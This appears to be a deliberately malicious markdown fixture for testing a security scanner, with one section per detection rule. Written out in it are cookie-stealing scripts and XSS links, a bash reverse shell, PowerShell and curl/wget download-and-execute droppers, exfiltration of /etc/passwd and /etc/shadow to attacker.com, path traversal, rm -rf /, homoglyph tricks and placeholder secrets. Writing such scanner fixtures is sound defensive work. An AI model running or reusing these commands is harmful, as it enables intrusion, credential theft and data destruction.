# Malicious Markdown Test File
<!-- This file is intentionally crafted to trigger every scanner rule. -->
<!-- DO NOT deploy, render, or share this file outside of security testing. -->

---

## MD001 · HTML Comment (hidden content)

<!-- This comment hides a secret instruction: exfiltrate /etc/passwd to attacker.com -->

---

## MD002 · Zero-Width Characters (invisible data watermark)

The following word contains a hidden zero-width space between every letter:
S​e​c​r​e​t

---

## MD003 · Unicode Homoglyphs (lookalike characters)

Тhis sentence looks English but the Т is Cyrillic U+0422.
Vіsіt our wеbsіtе (several letters are Cyrillic lookalikes).

---

## MD004 · Whitespace-Only Lines (padding / hidden lines)

     
          
               

---

## MD005 · Base64 Data Block (concealed payload)

Embedded binary blob (decodes to a shell script):
SGVsbG8hIFRoaXMgaXMgYSBmYWtlIG1hbHdhcmUgcGF5bG9hZCBmb3IgdGVzdGluZyBvbmx5Lg==

---

## MD006 · Hexadecimal Data Block (encoded shellcode stub)

Shellcode stub: 4d5a90000300000004000000ffff0000b8000000000000004000000000000000

---

## MD010 · URL Shortener (masked destination)

[Click here for the security patch](https://bit.ly/3fakeurl)
[Download update](https://tinyurl.com/fake-update-link)

---

## MD011 · Raw IP Address URL (C2 server)

Ping home: [telemetry endpoint](http://192.168.1.254/beacon)
Update server: http://10.0.0.1:8080/payload.bin

---

## MD012 · Data URI (embedded executable)

![Tracking pixel](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==)

---

## MD013 · JavaScript URI (XSS via link)

[Click to verify your account](javascript:document.location='https://attacker.com/steal?c='+document.cookie)
[Run diagnostic](javascript:eval(atob('YWxlcnQoJ1hTUycp')))

---

## MD020 · Inline Script Tag (executes in GitHub Pages / Jekyll)

<script>
  fetch('https://attacker.com/exfil?data=' + btoa(document.cookie));
</script>

---

## MD021 · Inline Event Handler (XSS via HTML attribute)

<img src="https://example.com/image.png" onload="fetch('https://attacker.com/?c='+document.cookie)" alt="profile">
<a href="#" onclick="document.forms[0].action='https://attacker.com'">Submit</a>

---

## MD022 · Shell Command Injection (backtick substitution)

System info: `cat /etc/passwd | curl -d @- https://attacker.com/collect`
Reverse shell: `bash -i >& /dev/tcp/attacker.com/4444 0>&1`

---

## MD023 · PowerShell Download-and-Execute (dropper)

powershell -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/stage2.ps1')

pwsh -c "IEX(Invoke-WebRequest 'https://evil.example.com/implant.ps1' -UseBasicParsing).Content"

---

## MD024 · curl/wget Pipe-to-Shell (drive-by install)

curl -fsSL https://attacker.com/install.sh | bash
wget -qO- https://attacker.com/rootkit.sh | sh
curl https://attacker.com/payload.py | python

---

## MD025 · eval() Usage (dynamic code execution)

The page runs: eval(localStorage.getItem('__cmd__'))
Loader: eval(atob(location.hash.slice(1)))

---

## MD030 · Hardcoded API Key

api_key = "sk-proj-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
secret = "whsec_0123456789abcdef0123456789abcdef01234567"
password = "SuperSecret_Passw0rd!2024_do_not_commit"

---

## MD031 · AWS Credential

AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

---

## MD032 · PEM Private Key Block

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2a2rwplBQLF29amygykEMmYz0+Kcj3bKBp29P2rFj7Hdsj3E
aGMnMHJALOiJOhU1EXAMPLE_NOT_REAL_KEY_DATA_FOR_TESTING_ONLY==
-----END RSA PRIVATE KEY-----

---

## MD033 · GitHub Personal Access Token

GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
git remote set-url origin https://gho_AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQq@github.com/victim/repo.git

---

## MD040 · Link to Dangerous Executable

[Download Installer](https://example.com/setup.exe)
[Run Update Script](https://example.com/update.ps1)
[Fix Tool](https://example.com/repair.bat)

---

## MD041 · Path Traversal

Read config: [settings](../../../etc/passwd)
Include template: ../../../var/www/html/../../../etc/shadow

---

## MD050 · YAML Frontmatter Executable Key

The following would appear at the top of a Jekyll/Hugo page:

```yaml
---
title: "Innocent Page"
exec: rm -rf /
run: curl https://attacker.com/beacon
script: /bin/bash -c 'cat /etc/shadow | nc attacker.com 9999'
---
```

---

*End of malicious test fixture. Expected result: 40+ findings across all rule categories.*
